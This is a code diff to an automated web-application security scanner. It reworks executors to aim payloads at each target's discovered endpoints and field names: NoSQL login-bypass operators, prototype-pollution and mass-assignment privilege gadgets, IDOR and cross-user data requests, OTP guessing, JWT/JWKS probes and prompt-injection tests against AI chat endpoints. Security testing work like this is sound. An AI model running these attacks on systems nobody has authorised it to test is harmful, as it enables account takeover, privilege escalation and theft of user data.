@@ -193,6 +193,85 @@ class GenericHTTPExecutor(ExecutorBase):
         discovered = self._discovered_endpoints(experiment)
         return [ep for ep in discovered if any(k in ep.lower() for k in keywords)]
 
+    def _endpoints_by_keywords(self, experiment: SecurityExperiment,
+                               keywords, fallback=()) -> List[str]:
+        """Union (content-first, with a guaranteed coverage floor): return the
+        app's DISCOVERED endpoints (captured traffic / JS-mined routes / crawl, via
+        ``_discovered_endpoints``) whose URL contains any of ``keywords`` — the real
+        path whatever it is named — FIRST, then ALWAYS append the hardcoded
+        ``fallback`` standards (base-resolved) that were not already discovered.
+
+        Discovered-first means a modern app's true endpoint is prioritized in the
+        early probe waves; appending the fixed set means a legacy/standard endpoint
+        that discovery missed is never skipped. Deduped by path (ignoring query).
+        Returns full/absolute URLs."""
+        kws = [k.lower() for k in keywords]
+        base = self._base(experiment).rstrip("/")
+        ordered: List[str] = []
+        seen = set()
+
+        def _add(u: str):
+            key = u.split("?")[0].lower()
+            if key not in seen:
+                seen.add(key)
+                ordered.append(u)
+
+        for ep in self._discovered_endpoints(experiment):   # content first (priority)
+            if any(k in ep.lower() for k in kws):
+                _add(ep)
+        for p in fallback:                                  # fixed standards floor
+            _add(p if p.startswith("http") else base + ("/" + p.lstrip("/")))
+        return ordered
+
+    def _rs_ctx(self, experiment):
+        """Adapter so the request_schema helpers (which read ``ctx.captured_requests``)
+        work from an executor that only holds ``experiment``. Exposes the captured
+        traffic so field NAMES are derived from the target, never guessed."""
+        from types import SimpleNamespace
+        return SimpleNamespace(
+            captured_requests=experiment.input_parameters.get("captured_requests") or [],
+            endpoints=experiment.input_parameters.get("endpoints") or [],
+            target=self._base(experiment))
+
+    def _privilege_field_candidates(self, experiment) -> List[str]:
+        """Privilege/role field NAMES observed in the target's OWN objects, derived
+        from captured request/response bodies — so mass-assignment / prototype-
+        pollution gadgets adapt to the app's real schema instead of a fixed guess.
+        Returns names that look authorization-bearing (role/admin/verified/etc. by
+        name, or any boolean field). Empty when nothing was captured."""
+        import re as _re
+        want = _re.compile(r"(role|admin|priv|perm|scope|group|level|verif|approv|"
+                           r"active|enabled|premium|deluxe|staff|owner|is_?[a-z])", _re.I)
+        names, seen = [], set()
+
+        def _walk(o, depth=0):
+            if depth > 4 or not isinstance(o, dict):
+                return
+            for k, v in o.items():
+                kl = str(k).lower()
+                if k not in seen and (want.search(kl) or isinstance(v, bool)):
+                    seen.add(k)
+                    names.append(k)
+                if isinstance(v, dict):
+                    _walk(v, depth + 1)
+                elif isinstance(v, list):
+                    for it in v[:5]:
+                        _walk(it, depth + 1)
+
+        for r in (experiment.input_parameters.get("captured_requests") or []):
+            if not isinstance(r, dict):
+                continue
+            for blob in (r.get("body"), r.get("post_data"), r.get("response_body"),
+                         (r.get("response") or {}).get("body") if isinstance(r.get("response"), dict) else None):
+                if isinstance(blob, dict):
+                    _walk(blob)
+                elif isinstance(blob, str) and blob.strip().startswith("{"):
+                    try:
+                        _walk(json.loads(blob))
+                    except Exception:
+                        pass
+        return names
+
     def _credential_endpoints(self, experiment: SecurityExperiment) -> List[str]:
         """Credential-accepting endpoints discovered from captured traffic — any
         request whose body carries a password-shaped field. Finds the REAL login
@@ -425,22 +504,19 @@ class GraphQLExecutor(GenericHTTPExecutor):
         start = time.monotonic()
         base = self._base(experiment)
 
-        # Check discovered endpoints for graphql-like paths, plus common ones
-        gql_paths = self._to_paths(
-            self._endpoints_by_role(experiment, "data"), base)
-        common = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]
-        seen = set(gql_paths)
-        for c in common:
-            if c not in seen:
-                gql_paths.append(c)
+        # Content-driven: the app's real GraphQL endpoint (from traffic/JS, whatever
+        # its path), fixed common paths only when none were observed.
+        gql_targets = self._endpoints_by_keywords(
+            experiment, ("graphql", "gql", "/query"),
+            ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"])
 
         query = '{"query": "{ __schema { types { name } } }"}'
         headers = {"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"}
         introspection = False
         best_body = ""
         best_status = 0
-        for gp in gql_paths[:10]:
-            status, body, _ = self._probe(f"{base}{gp}", method="POST",
+        for gp in gql_targets[:10]:
+            status, body, _ = self._probe(gp, method="POST",
                                            headers=headers, data=query.encode())
             if "__schema" in body or '"types"' in body:
                 introspection = True
@@ -732,6 +808,17 @@ class NoSQLiExecutor(GenericHTTPExecutor):
 
         rand = __import__("uuid").uuid4().hex[:12]
 
+        # Derive the target's REAL credential field names from captured traffic;
+        # build operator payloads over them so the bypass matches this app's login
+        # shape. Static combos are unioned as a fallback for shapes we didn't see.
+        _cf = rs.credential_fields(self._rs_ctx(experiment), ("login", "auth", "signin", "session"))
+        _uf, _pf = _cf["username_field"], _cf["password_field"]
+        dyn_payloads = []
+        for _op in ({"$ne": ""}, {"$gt": ""}, {"$regex": ".*"}, {"$exists": True}):
+            dyn_payloads.append({_uf: dict(_op), _pf: dict(_op)})
+        body_payloads = dyn_payloads + [p for p in self.NOSQLI_BODY_PAYLOADS
+                                        if not (set(p) == {_uf, _pf})]
+
         def _authed(st, bd):
             return st in (200, 201) and any(
                 s in (bd or "").lower() for s in
@@ -754,11 +841,11 @@ class NoSQLiExecutor(GenericHTTPExecutor):
             # baseline: syntactically valid but wrong credentials (no operators)
             b_status, b_body, _ = self._probe(
                 f"{base}{lp}", method="POST", headers=jhdr,
-                data=json.dumps({"email": f"{rand}@invalid.example",
-                                 "password": rand}).encode())
+                data=json.dumps({_uf: f"{rand}@invalid.example",
+                                 _pf: rand}).encode())
             if _authed(b_status, b_body):
                 continue  # authenticates on garbage creds → not a valid bypass oracle
-            for payload in self.NOSQLI_BODY_PAYLOADS:
+            for payload in body_payloads:
                 status, body, _ = self._probe(
                     f"{base}{lp}", method="POST", headers=jhdr,
                     data=json.dumps(payload).encode())
@@ -881,10 +968,24 @@ class PrototypePollutionExecutor(GenericHTTPExecutor):
         base = self._base(experiment)
         findings = []
 
+        # Gadget property names from the target's OWN objects (observed) polluted
+        # via __proto__/constructor, then the static gadgets as a floor — so the
+        # polluted field matches an authorization check this app actually performs.
+        def _gmut(f):
+            fl = f.lower()
+            val = "admin" if any(w in fl for w in ("role", "level", "group", "scope", "plan")) else True
+            return [{"__proto__": {f: val}}, {"constructor": {"prototype": {f: val}}}]
+        pollution_payloads = []
+        for f in self._privilege_field_candidates(experiment)[:6]:
+            pollution_payloads.extend(_gmut(f))
+        for _s in self.POLLUTION_PAYLOADS:               # static gadget floor
+            if _s not in pollution_payloads:
+                pollution_payloads.append(_s)
+
         json_eps = self._json_accepting_endpoints(experiment)
         for ep in json_eps[:12]:
             for method in ["PUT", "POST"]:
-                for payload in self.POLLUTION_PAYLOADS:
+                for payload in pollution_payloads:
                     status, body, _ = self._probe(
                         f"{base}{ep}", method=method,
                         headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
@@ -1090,7 +1191,7 @@ class IDORExecutor(GenericHTTPExecutor):
 
         # Auto-generate IDOR tests from ALL endpoints containing numeric IDs
         id_endpoints = self._endpoints_with_ids(experiment)
-        for orig_path, orig_id, swapped_path in id_endpoints[:20]:
+        for orig_path, _orig_id, swapped_path in id_endpoints[:20]:
             status, body, _ = self._probe(f"{base}{swapped_path}",
                                            headers=self._auth_headers(experiment))
             if status == 200 and len(body) > 10:
@@ -1103,7 +1204,7 @@ class IDORExecutor(GenericHTTPExecutor):
                     })
 
         # PUT/DELETE method tests on first few ID endpoints
-        for orig_path, orig_id, swapped_path in id_endpoints[:5]:
+        for _orig_path, _orig_id, swapped_path in id_endpoints[:5]:
             for method in ["PUT", "DELETE"]:
                 status, body, _ = self._probe(
                     f"{base}{swapped_path}", method=method,
@@ -1113,16 +1214,34 @@ class IDORExecutor(GenericHTTPExecutor):
                     findings.append({"test": f"idor_{method.lower()}", "path": swapped_path,
                                      "status": status})
 
-        # If our numeric matcher found no ID endpoints, only guess the generic
-        # /api/users/{i} pattern when discovery shows the target actually exposes
-        # id-bearing paths (UUID/ObjectId/etc. the numeric matcher missed).
+        # Numeric matcher found nothing, but the target may expose id-bearing paths
+        # the matcher missed (UUID/ObjectId/etc). Probe the ACTUAL discovered
+        # id-bearing endpoints with a small numeric substitution in the id segment —
+        # the path comes from the target, never a hardcoded route like /api/users.
         if not id_endpoints:
-            if any(ts.id_path_segments(ep) for ep in self._discovered_endpoints(experiment)):
+            from urllib.parse import urlsplit
+            seen: set = set()
+            for ep in self._discovered_endpoints(experiment):
+                seg_ids = ts.id_path_segments(ep)
+                if not seg_ids:
+                    continue
+                parts = [s for s in urlsplit(ep).path.split("/") if s]
+                idx = seg_ids[0][0]
+                if idx >= len(parts):
+                    continue
                 for i in range(1, 4):
-                    status, body, _ = self._probe(f"{base}/api/users/{i}")
+                    np = list(parts)
+                    np[idx] = str(i)
+                    probe_path = "/" + "/".join(np)
+                    if probe_path in seen:
+                        continue
+                    seen.add(probe_path)
+                    status, body, _ = self._probe(f"{base}{probe_path}")
                     if status == 200 and len(body) > 10:
-                        findings.append({"test": "idor_generic", "path": f"/api/users/{i}",
+                        findings.append({"test": "idor_generic", "path": probe_path,
                                          "status": status, "body_snippet": body[:256]})
+                if len(seen) >= 12:
+                    break
 
         evidence = self.collect_evidence({
             "idor_findings": findings, "findings_count": len(findings),
@@ -1162,12 +1281,26 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
         if not reg_eps and not update_eps:
             return _no_endpoints_result("no auth/user endpoints for mass-assignment")
 
+        # Privilege mutations: the target's OWN authorization-bearing fields
+        # (observed in captured objects) FIRST, then the static gadgets as a floor.
+        def _mut(f):
+            fl = f.lower()
+            if any(w in fl for w in ("role", "level", "group", "scope", "type", "plan", "tier")):
+                return {f: "admin"}
+            if "perm" in fl:
+                return {f: ["admin", "superuser"]}
+            return {f: True}
+        priv_fields = [_mut(f) for f in self._privilege_field_candidates(experiment)[:8]]
+        for _s in self.PRIV_FIELDS:                      # static gadget floor
+            if _s not in priv_fields:
+                priv_fields.append(_s)
+
         # Registration body mirrors the captured register form (real username /
-        # password / confirm field names); the mass-assignment PRIV_FIELDS merge on top.
+        # password / confirm field names); the privilege mutations merge on top.
         reg_body = rs.build_register_body(
             self._rs_ctx(experiment), f"masstest_{ts}@test.com", "Test1234!")
         for ep in reg_eps[:6]:
-            for extra in self.PRIV_FIELDS:
+            for extra in priv_fields:
                 payload = {**reg_body, **extra}
                 status, body, _ = self._probe(
                     f"{base}{ep}", method="POST",
@@ -1184,7 +1317,7 @@ class MassAssignmentExecutor(GenericHTTPExecutor):
 
         # 2. Profile update — PUT/PATCH on user/config endpoints (discovered above)
         for ep in update_eps[:6]:
-            for extra in self.PRIV_FIELDS[:3]:
+            for extra in priv_fields[:4]:
                 for method in ["PUT", "PATCH"]:
                     status, body, _ = self._probe(
                         f"{base}{ep}", method=method,
@@ -1648,7 +1781,7 @@ class RateLimitExecutor(GenericHTTPExecutor):
             hdrs = {**headers, "Content-Type": "application/json"}
             body = json.dumps(rs.build_login_body(
                 self._rs_ctx(experiment), "ratetest@example.com", "wrong")).encode()
-            for i in range(self.BURST):
+            for _i in range(self.BURST):
                 status, _, _ = self._probe(full, method="POST", headers=hdrs, data=body)
                 statuses.append(status)
                 if status == 429:
@@ -1700,9 +1833,13 @@ class LogInjectionExecutor(GenericHTTPExecutor):
                                  "path": path, "status": status,
                                  "body_snippet": body[:256]})
 
-        # 2) Probe standard log paths for exposure
-        for lp in self.LOG_PATHS:
-            status, body, _ = self._probe(base + lp, headers=headers)
+        # 2) Probe for exposed log endpoints — discovered log/audit routes first,
+        # fixed log paths only when none were observed.
+        for url in self._endpoints_by_keywords(
+                experiment, ("/logs", "/logging", "access.log", "error.log", ".log", "/audit"),
+                self.LOG_PATHS):
+            lp = urlparse(url).path or url
+            status, body, _ = self._probe(url, headers=headers)
             if status == 200 and len(body) > 50 and not body.strip().startswith(("<!DOCTYPE", "<html")):
                 findings.append({"test": "log_file_exposed",
                                  "path": lp, "status": status,
@@ -2045,8 +2182,12 @@ class AdvancedJWTExecutor(GenericHTTPExecutor):
         # Discover a JWKS
         jwks_pub_pem = None
         jwks_used_path = None
-        for wp in self.JWKS_PATHS:
-            status, body, _ = self._probe(base + wp, headers=headers)
+        # Discovered JWKS/keys endpoints first (whatever the path), fixed well-known
+        # locations as a floor.
+        for wp in self._endpoints_by_keywords(
+                experiment, ("jwks", "/keys", "/.well-known/jwks", "certs", "publickey"),
+                self.JWKS_PATHS):
+            status, body, _ = self._probe(wp, headers=headers)
             if status == 200 and ("keys" in body and "kty" in body):
                 jwks_used_path = wp
                 try:
@@ -3192,10 +3333,18 @@ class MFABypassExecutor(GenericHTTPExecutor):
         if verify_eps and stage1_token:
             hdrs = {**headers, "Content-Type": "application/json",
                     "Authorization": f"Bearer {stage1_token}"}
+            # The target's REAL OTP field name from the captured verify body, with
+            # the static aliases as a floor.
+            _vb = rs.captured_body_for(
+                self._rs_ctx(experiment), ("verify", "mfa", "2fa", "otp", "totp", "code", "auth"))
+            otp_fields = [k for k in _vb.keys()] or []
+            for f in self.OTP_FIELDS:
+                if f not in otp_fields:
+                    otp_fields.append(f)
             for ep in verify_eps[:2]:
                 blocked = False
                 for otp in self.GUESSABLE_OTPS[:10]:
-                    for field in self.OTP_FIELDS[:4]:
+                    for field in otp_fields[:4]:
                         body = json.dumps({field: otp}).encode()
                         s, r, _ = self._probe(base + ep, method="POST",
                                               headers=hdrs, data=body)
@@ -3756,15 +3905,17 @@ class BlockchainWeb3Detector(GenericHTTPExecutor):
         headers = self._auth_headers(experiment)
         findings = []
 
-        # (a) Probe common RPC paths — JSON-RPC accepts POST {"jsonrpc":"2.0","method":"eth_blockNumber"}
+        # (a) Probe JSON-RPC endpoints — discovered RPC/web3 routes first, fixed
+        # paths only when none were observed. JSON-RPC accepts POST eth_blockNumber.
         hdrs = {**headers, "Content-Type": "application/json"}
-        for rp in self.RPC_PATHS:
+        for url in self._endpoints_by_keywords(
+                experiment, ("rpc", "web3", "jsonrpc", "json-rpc", "/eth", "ethereum"),
+                self.RPC_PATHS):
             payload = json.dumps({"jsonrpc": "2.0", "method": "eth_blockNumber",
                                   "params": [], "id": 1}).encode()
-            status, body, _ = self._probe(base + rp, method="POST",
-                                          headers=hdrs, data=payload)
+            status, body, _ = self._probe(url, method="POST", headers=hdrs, data=payload)
             if status == 200 and '"result"' in body and "0x" in body:
-                findings.append({"test": "web3_rpc_exposed", "path": rp,
+                findings.append({"test": "web3_rpc_exposed", "path": urlparse(url).path or url,
                                  "status": status, "body_snippet": body[:256]})
 
         # (b) Scan discovered assets for private keys / mnemonic / ABI
@@ -3917,10 +4068,21 @@ class GDPRAbuseDetector(GenericHTTPExecutor):
         start = time.monotonic()
         findings = []
 
-        # (a) Try each GDPR path WITHOUT auth
+        # Content-driven: probe the app's REAL privacy/export/erasure endpoints
+        # (discovered from traffic/JS), not a fixed guess. Keyword fallback only
+        # when nothing matching was observed.
+        targets = self._endpoints_by_keywords(
+            experiment,
+            ("gdpr", "dsar", "export", "data-export", "data-portability", "portability",
+             "privacy", "rtbf", "right-to-be-forgotten", "download-data", "erase",
+             "forget", "account/delete", "user/delete", "delete-account"),
+            self.GDPR_PATHS)[:25]
+
+        # (a) Try each target WITHOUT auth
         no_auth_hdrs = {"User-Agent": "AntiGravity-V2/1.0"}
-        for p in self.GDPR_PATHS:
-            status, body, _ = self._probe(base + p, headers=no_auth_hdrs)
+        for url in targets:
+            p = urlparse(url).path or url
+            status, body, _ = self._probe(url, headers=no_auth_hdrs)
             if status == 200 and len(body) > 60 and not body.strip().startswith(("<!DOCTYPE", "<html")):
                 findings.append({"test": "gdpr_endpoint_no_auth",
                                  "path": p, "status": status,
@@ -3929,9 +4091,10 @@ class GDPRAbuseDetector(GenericHTTPExecutor):
         # (b) Try cross-user access with any auth token we have
         auth_headers = self._auth_headers(experiment)
         if "Authorization" in auth_headers or "Cookie" in auth_headers:
-            for p in self.GDPR_PATHS:
+            for url0 in targets:
+                p = urlparse(url0).path or url0
                 for other_id in ("1", "2", "admin", "0"):
-                    url = base + p + ("&" if "?" in p else "?") + f"user_id={other_id}"
+                    url = url0 + ("&" if "?" in url0 else "?") + f"user_id={other_id}"
                     status, body, _ = self._probe(url, headers=auth_headers)
                     if status == 200 and len(body) > 60:
                         low = body.lower()
@@ -4681,10 +4844,13 @@ class SAMLFlawDetector(GenericHTTPExecutor):
         findings = []
         import base64 as _b64
 
-        saml_eps = list(self.SAML_HINTS) + [
-            e for e in self._all_endpoints_as_paths(experiment)
-            if "saml" in e.lower() or "sso" in e.lower()
-        ]
+        # Discovered SAML/SSO endpoints FIRST (whatever the path), fixed hints as a
+        # floor — content-first union.
+        saml_eps = [e for e in self._all_endpoints_as_paths(experiment)
+                    if any(k in e.lower() for k in ("saml", "sso", "adfs", "idp", "simplesaml"))]
+        for h in self.SAML_HINTS:
+            if h not in saml_eps:
+                saml_eps.append(h)
         saml_eps = list(dict.fromkeys(saml_eps))[:8]
 
         for ep in saml_eps:
@@ -4749,20 +4915,32 @@ class PromptInjectionTester(GenericHTTPExecutor):
         headers = self._auth_headers(experiment)
         findings = []
 
-        # Discover LLM endpoints via well-known paths + role-based hits
-        eps = list(self.LLM_HINTS)
-        for p in self._all_endpoints_as_paths(experiment):
-            low = p.lower()
-            if any(k in low for k in ("chat", "completion", "assistant", "llm", "/ai")):
-                eps.append(p)
+        # Discovery-first: the app's REAL chat/LLM endpoints (from traffic/JS),
+        # fixed hints only when none were observed.
+        eps = self._endpoints_by_keywords(
+            experiment,
+            ("chat", "completion", "assistant", "llm", "/ai", "/gpt", "prompt",
+             "conversation", "message", "generate", "ask", "copilot"),
+            self.LLM_HINTS)
         eps = list(dict.fromkeys(eps))[:10]
+
+        # Prompt field names from the target's OWN captured LLM request body (only
+        # string-valued keys, so we don't clobber model/temperature params), with
+        # the static FIELDS as a floor.
+        _lb = rs.captured_body_for(
+            self._rs_ctx(experiment),
+            ("chat", "completion", "llm", "assistant", "/ai", "message", "prompt", "generate"))
+        llm_fields = [k for k, v in _lb.items() if isinstance(v, str)]
+        for f in self.FIELDS:
+            if f not in llm_fields:
+                llm_fields.append(f)
 
         hdrs = {**headers, "Content-Type": "application/json"}
         for ep in eps:
             hit_any = False
             for pl in self.INJECTIONS[:3]:
-                body = json.dumps({f: pl for f in self.FIELDS}).encode()
-                s, resp, _ = self._probe(base + ep, method="POST", headers=hdrs, data=body)
+                body = json.dumps({f: pl for f in llm_fields}).encode()
+                s, resp, _ = self._probe(ep, method="POST", headers=hdrs, data=body)
                 if not s:
                     continue
                 if self.MARKER in resp:
@@ -4917,7 +5095,7 @@ class HeaderRateLimitBypassExecutor(GenericHTTPExecutor):
         for ep in auth_eps[:2]:
             # Drive to 429
             hit429 = False
-            for i in range(25):
+            for _i in range(25):
                 s, _, _ = self._probe(base + ep, method="POST", headers=hdrs, data=body)
                 if s == 429:
                     hit429 = True
